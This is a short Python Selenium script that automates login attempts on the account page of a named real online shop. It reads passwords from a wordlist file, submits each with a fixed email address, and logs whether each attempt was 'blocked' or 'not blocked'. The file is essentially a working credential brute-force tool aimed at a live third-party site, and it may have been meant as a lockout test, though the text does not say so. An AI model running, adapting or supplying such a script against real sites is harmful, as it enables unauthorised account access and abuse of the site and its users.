from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time

driver = webdriver.Firefox()
emailw = "presaneuffapa-3072@yopmail.com"
r = open("../pass_bruta_2.txt","r")
k = open("pass_bruta_2_result.txt","w")

driver.get("https://cultiseeds.cl/mi-cuenta/")

for linea in r:
    a = driver.find_element_by_xpath("//input[@id='username']")
    a.clear()
    a.send_keys(emailw)
    a = driver.find_element_by_xpath("//input[@id='password']")
    a.clear()
    a.send_keys(linea)
    a = driver.find_element_by_xpath("//button[@class='woocommerce-button button woocommerce-form-login__submit']")
    a.click()
    try:
        b = driver.find_element_by_xpath("//ul[@class='woocommerce-error']/li")
        k.write(linea.rstrip("\n")+" | NO BLOQUEADO\n")
        next
    except:
        k.write(linea.rstrip("\n")+" | BLOQUEADO\n")
        next
r.close()
k.close()
